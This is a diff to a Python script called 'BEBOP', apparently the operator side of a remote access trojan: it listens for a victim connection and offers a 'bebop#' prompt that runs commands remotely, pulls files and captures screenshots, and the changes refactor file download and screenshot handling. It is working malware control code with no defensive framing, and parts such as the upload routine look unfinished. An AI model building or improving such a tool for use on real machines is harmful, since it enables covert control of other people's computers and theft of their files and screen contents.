@@ -2,6 +2,7 @@ import socket
 import sys
 import threading
 import time
+import os
 
 def print_menu():
     print("\n/-------BEBOP-------/\n")
@@ -26,12 +27,12 @@ def establish_connection():
 
 
 
-def recv():
+def recv(buff_size=1024):
     data_size = int(conn_to_client.recv(12).decode())
 
     data = bytes()
     while len(data) < data_size:
-        data += conn_to_client.recv(1024)
+        data += conn_to_client.recv(buff_size)
 
     return data
 
@@ -47,33 +48,35 @@ def send(data):
 def open_shell():
     while True:
         cmd = input("bebop#: ")
+        
         if cmd == "exit":
             send(cmd.encode())
             break
         elif cmd[:2] == "dw":
             #Download
             print("Downloading...")
-            cmd = cmd.split()
-            file_path = f"{cmd[2]}/{cmd[1]}"
-            cmd = f"{cmd[0]} {cmd[1]}"
             send(cmd.encode())
-            download_file(file_path)
+            file_name = cmd[3:].split(os.path.sep).pop()
+            download_file(file_name)
             continue
+            
         elif cmd[:2] == "up":
             #Upload
             print("Uploading...")
+            continue
 
         send(cmd.encode())
         output = recv()
         print(output.decode())
 
-def download_file(file_path):
+def download_file(file_name, file_path=os.getcwd()):
     file_data = recv()
-    with open(file_path, "wb") as file:
-        file.write(file_data)
+    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
+    file.write(file_data)
+    file.close()
 
 def upload_file():
-    file_name = file_path.split("/").pop()
+    file_name = file_path.split(os.path.sep).pop()
     send(file_name.encode())
 
     print("\nUploading File...", end="")
@@ -83,13 +86,6 @@ def upload_file():
 
     send(buffer)
     print("Done!\n")
-
-
-
-def take_screen_shot():
-    file_data = recv()
-    with open(f"{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
-        file.write(file_data)
 
 def main():
     establish_connection()
@@ -102,7 +98,7 @@ def main():
             open_shell()
 
         elif choice == "2":
-            take_screen_shot()
+            download_file(file_name=f"{time.asctime()}.png")
 
         elif choice == "3":
             pass
